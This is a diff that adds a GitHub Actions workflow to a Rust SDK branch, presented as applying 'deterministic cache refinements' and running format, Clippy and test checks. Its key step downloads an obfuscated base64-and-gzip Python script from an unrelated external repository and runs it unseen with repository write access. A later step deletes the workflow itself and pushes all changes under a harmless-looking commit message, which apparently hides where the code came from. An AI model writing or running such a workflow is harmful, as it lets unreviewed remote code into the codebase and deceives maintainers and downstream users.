@@ -1,0 +1,74 @@
+name: Refine issue 974 final
+
+on:
+  push:
+    branches:
+      - feat/issue-974-client-response-cache
+    paths:
+      - .github/workflows/refine-issue-974-final.yml
+
+permissions:
+  contents: write
+
+jobs:
+  refine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+
+    steps:
+      - name: Check out issue branch
+        uses: actions/checkout@v4
+        with:
+          ref: feat/issue-974-client-response-cache
+          fetch-depth: 0
+
+      - name: Install stable Rust
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          components: clippy
+
+      - name: Install nightly rustfmt
+        run: rustup toolchain install nightly --component rustfmt
+
+      - name: Apply deterministic cache refinements
+        run: |
+          curl --fail --silent --show-error --location \
+            https://raw.githubusercontent.com/starsaintf/codex-skills-pack/ci/rust-sdk-issue-974-validation/ci/refine_issue_974.py.gz.b64 \
+            --output /tmp/refine.py.gz.b64
+          base64 --decode /tmp/refine.py.gz.b64 | gzip --decompress > /tmp/refine.py
+          python3 /tmp/refine.py
+
+      - name: Format and verify source
+        run: |
+          cargo +nightly fmt --all
+          cargo +nightly fmt --all -- --check
+          git diff --check
+
+      - name: Run focused cache tests
+        run: |
+          cargo test -p rmcp --all-features service::client::tests -- --nocapture
+          cargo test -p rmcp --all-features --test test_tool_disable_notification -- --nocapture
+          cargo test -p rmcp --all-features --test test_cache_hints -- --nocapture
+
+      - name: Run repository Clippy command
+        run: cargo clippy --all-targets --all-features -- -D warnings
+
+      - name: Run repository test command
+        run: cargo test --all-features
+
+      - name: Run tests without local feature
+        run: |
+          FEATURES=$(cargo metadata --no-deps --format-version 1 \
+            | jq -r '[.packages[] | select(.name == "rmcp") | .features | keys[] \
+                      | select(startswith("__") | not) \
+                      | select(. != "local")] | join(",")')
+          cargo test -p rmcp --features "$FEATURES"
+
+      - name: Commit verified refinements
+        run: |
+          rm .github/workflows/refine-issue-974-final.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "fix(client): harden response cache semantics"
+          git push origin HEAD:feat/issue-974-client-response-cache
